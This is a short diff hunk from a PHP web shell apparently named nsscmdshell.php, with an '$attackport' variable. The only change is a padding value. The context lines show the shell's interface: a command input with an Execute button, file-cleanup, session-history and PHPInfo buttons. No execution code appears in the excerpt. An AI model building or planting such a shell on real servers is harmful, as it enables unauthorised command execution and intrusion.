@@ -38,7 +38,7 @@ $attackport = "8000";
             }
         }
         echo '
-        <div style="border:1px solid #333;width:50%;padding:10px 30px;border-radius:10px;margin:10px 40px;">
+        <div style="border:1px solid #333;width:50%;padding:20px 30px;border-radius:10px;margin:10px 40px;">
         <div style="display:inline;margin:10px;"><form style="float:left" action="" method="get">Command? <input type="text" name="cmd" autofocus/>
         <button type="submit">Execute</button>&nbsp;&nbsp;&nbsp;&nbsp;<a href="?links=1">QuickLinks</a></form><form style="float:right" action="nsscmdshell.php" method="GET"><button name="clean" id="action-button" title="deletes all files uploaded using nsscmdshell.  please note that you must manually remove nsscmdshell."> Cleanup Files </button>&nbsp;&nbsp;<button name="check" id="action-button" title="show var_dump for $_SESSION[\'actions\']"> Show History </button>&nbsp;&nbsp;<button name="phpInfo"> PHPInfo </button></form></div>
 <p>&nbsp;</p>
